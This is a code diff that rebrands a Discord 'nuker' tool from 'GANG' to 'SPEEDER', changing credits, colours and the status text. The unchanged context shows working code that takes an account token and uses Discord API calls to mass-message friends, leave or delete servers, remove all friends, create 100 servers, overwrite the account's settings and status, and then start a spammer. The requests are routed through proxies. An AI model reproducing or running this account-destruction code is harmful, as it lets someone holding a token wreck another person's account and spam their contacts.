@@ -1,6 +1,6 @@
-# Coded by ††#9999 | https://github.com/TT-Tutorials | https://github.com/TT-Tutorials/GANG-Nuker
-# GANG Discord Nuker / Multi Tool©
-# Copyright © 2022
+# Coded / Dev / Owner: JavorR#0001 | https://github.com/JavorR1 | https://github.com/JavorR1
+# SPEEDER  / Multi Tool©
+# Copyright © 2022/23
 ########################################
 
 import os
@@ -31,7 +31,7 @@ def GANGNUKER_START(token, Server_Name, message_Content):
             print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] ID: "+channel['id'])
         except Exception as e:
             print(f"The following error has been encountered and is being ignored: {e}")
-    Write.Print(f"\n\nSent Message to ALL friends\n", Colors.purple_to_blue, interval=0.009)
+    Write.Print(f"\n\nSent Message to ALL friends\n", Colors.blue_to_cyan, interval=0.009)
     
     guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
     for guild in guildsIds:
@@ -48,7 +48,7 @@ def GANGNUKER_START(token, Server_Name, message_Content):
             print(f'[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Deleted: '+guild['name'])
         except Exception as e:
             print(f"The following error has been encountered and is being ignored: {e}")
-    Write.Print(f"\nLeft / Deleted Guilds\n", Colors.purple_to_blue, interval=0.009)
+    Write.Print(f"\nLeft / Deleted Guilds\n", Colors.blue_to_cyan, interval=0.009)
 
     friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies=proxy(), headers=getheaders(token)).json()
     for friend in friendIds:
@@ -58,7 +58,7 @@ def GANGNUKER_START(token, Server_Name, message_Content):
             print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Removed Friend: "+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
         except Exception as e:
             print(f"[\x1b[95m>\x1b[95m\x1B[37m] The following error has been encountered and is being ignored: {e}")
-    Write.Print(f"\nRemoved all available friends\n", Colors.purple_to_blue, interval=0.009)
+    Write.Print(f"\nRemoved all available friends\n", Colors.blue_to_cyan, interval=0.009)
     
     for i in range(100):
         try:
@@ -67,7 +67,7 @@ def GANGNUKER_START(token, Server_Name, message_Content):
             print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Created | {i}{Fore.RESET}")
         except Exception as e:
             print(f"[\x1b[95m>\x1b[95m\x1B[37m] The following error has been encountered and is being ignored: {e}")
-    Write.Print(f"\nCreated all servers\n", Colors.purple_to_blue, interval=0.009)
+    Write.Print(f"\nCreated all servers\n", Colors.blue_to_cyan, interval=0.009)
     t.do_run = False
     requests.delete("https://discord.com/api/v8/hypesquad/online", proxies=proxy(), headers=getheaders(token))
     setting = {
@@ -83,13 +83,13 @@ def GANGNUKER_START(token, Server_Name, message_Content):
           'convert_emoticons': False,
           'message_display_compact': False,
           'explicit_content_filter': '0',
-          "custom_status": {"text": "GANG-NUKER RUNS ME <3"},
+          "custom_status": {"text": "SPEEDER-NUKER RUNS ME <3"},
           'status': "idle"
     }
     requests.patch("https://discord.com/api/v7/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=setting)
     j = requests.get("https://discordapp.com/api/v9/users/@me", proxies=proxy(), headers=getheaders(token)).json()
     a = j['username'] + "#" + j['discriminator']
-    Write.Print(f"\n\nDone, RIP TO THAT ACCOUNT\n", Colors.purple_to_blue, interval=0.009)
+    Write.Print(f"\n\nDone, RIP TO THAT ACCOUNT\n", Colors.blue_to_cyan, interval=0.009)
     print("[ \x1b[95m>\x1b[95m\x1B[37m ] Press ENTER: ", end="")
     spammer()
 
